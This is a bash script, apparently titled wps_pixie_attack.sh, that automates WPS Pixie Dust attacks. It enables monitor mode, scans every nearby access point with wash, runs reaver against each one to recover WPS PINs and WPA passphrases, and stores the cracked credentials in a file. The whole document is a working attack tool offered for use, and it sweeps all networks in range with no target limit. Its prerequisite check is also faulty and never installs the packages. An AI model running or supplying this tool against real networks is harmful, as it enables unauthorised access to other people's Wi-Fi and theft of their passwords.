#!/bin/bash

#==================================
#===========Prerequisites==========
#==================================
needAdditionalPackages=0
if command -v wash &> /dev/null; 
then
	needAdditionalPackages=1
fi

if command -v jq &> /dev/null; 
then
	needAdditionalPackages=1
fi

if command -v reaver &> /dev/null; 
then
	needAdditionalPackages=1
fi

if command -v airmon-ng &> /dev/null; 
then
	needAdditionalPackages=1
fi

if [ ! -n $needAdditionalPackages ] 
then
	sudo apt-get update
	sudo apt-get install -y --no-install-recommends wash jq reaver airmon-ng
fi

#==================================
#===========Configurable===========
#==================================

# Default values
interfaceToUse=wlan0
scanTime=30s
crackTime=20s

scriptFileFolder="WPScrack/"
collectedBssidsFileName=${scriptFileFolder}bssids_collection.txt
collectedCrackedBssidsFileName=${scriptFileFolder}cracked_collection.txt
specialSeparator="%"

#==================================

Help()
{
	# Display Help
	echo
	echo "Syntax: wps_pixie_attack.sh [-i|s|c|f|h]"
	echo "options:"
	echo "-i	Use desired interface ( -i wlan0 )"
	echo "-h	Print Hhelp."
	echo "-s	Scan time in seconds ( -s 30 ) Default: 30"
	echo "-c	Crack time in seconds ( -c 20 ) Default: 20"
	echo "-f	Save collected bssids info to a file"
	echo
}


#==================================
#==============Script==============
#==================================

while getopts i:s:c:fh opt
do
    case "${opt}" in
        i) interfaceToUse=${OPTARG};;
        s) scanTime=${OPTARG}s;;
        c) crackTime=${OPTARG}s;;
		f) saveScannedResult=true;;
		h) Help; exit;;
    esac
done

if [ ! -d "$scriptFileFolder" ]
then
	mkdir $scriptFileFolder
fi

monitorInterfaceToUse=$interfaceToUse"mon"

sudo airmon-ng stop $monitorInterfaceToUse
sudo airmon-ng start $interfaceToUse
collectedJson=$(sudo timeout $scanTime wash -i $monitorInterfaceToUse -j)
collectedBssids=$(echo "$collectedJson" | jq -r '[.essid, .bssid, .channel, .wps_manufacturer, .wps_model_name, .wps_model_number] | "\(.[0])%\(.[1])%\(.[2])%\(.[3])%\(.[4])%\(.[5])"')


if [ ! -z "$collectedBssids" ] && [ ! "$collectedBssids" = $'\n' ]
then
	echo "[+] Collected BSSIDs:"
	echo -e "$collectedBssids\n" | tr "$specialSeparator" " "

	if [ ! -z "$saveScannedResult" ]
	then
		if [ -f "$collectedBssidsFileName" ];
		then
			concat=$(echo -e "$collectedBssids\n""$(cat $collectedBssidsFileName)" | tr "$specialSeparator" " " | sort -u)
			echo "$concat" > $collectedBssidsFileName
			concat=
			echo -e "[+] Collected BSSIDs saved to file\n"
		else
			echo "$collectedBssids" | tr "$specialSeparator" " " > $collectedBssidsFileName
			echo -e "[+] Collected BSSIDs saved to file\n"
		fi
	fi

	crackedPins=
	while read -r line
	do
		IFS="$specialSeparator" read essid bssid channel wps_manufacturer wps_model_name wps_model_number <<< "$line"

		echo "[+] Probing ESSID: $essid BSSID: $bssid"

		output=$(sudo timeout $crackTime reaver -i $monitorInterfaceToUse -b $bssid -vv -s -q -K 1 -c $channel)

		pin=$(echo "$output" | awk '/WPS PIN/ {print $NF}' | tr -d \')
		password=$(echo "$output" | awk '/WPA PSK/ {print $NF}' | tr -d \')

		if [ -n "$pin" ] && [ -n "$password" ] 
		then
			line=$(echo "$essid $bssid $wps_manufacturer $wps_model_name $wps_model_number $pin $password")
			crackedPins="$crackedPins$line\n"
			echo -e "[+] CRACKED: ESSID $essid - BSSID $bssid . Pin: $pin Password: $password\n"
		fi

	done <<< "$collectedBssids"

	if [ ! -z "$crackedPins" ]
	then
		if [ -f "$collectedCrackedBssidsFileName" ]
		then
			concat=$(echo -e "$crackedPins\n""$(cat $collectedCrackedBssidsFileName)" | sort -u)
			echo "$concat" > $collectedCrackedBssidsFileName
			concat=
			echo -e "[+] Cracked BSSIDs saved to file\n"
		else

			echo $crackedPins > $collectedCrackedBssidsFileName
			echo -e "[+] Cracked BSSIDs saved to file\n"
		fi
	fi
else
	echo -e "\n[-] No BSSIDs colected"
fi

sudo airmon-ng stop $monitorInterfaceToUse

#==================================
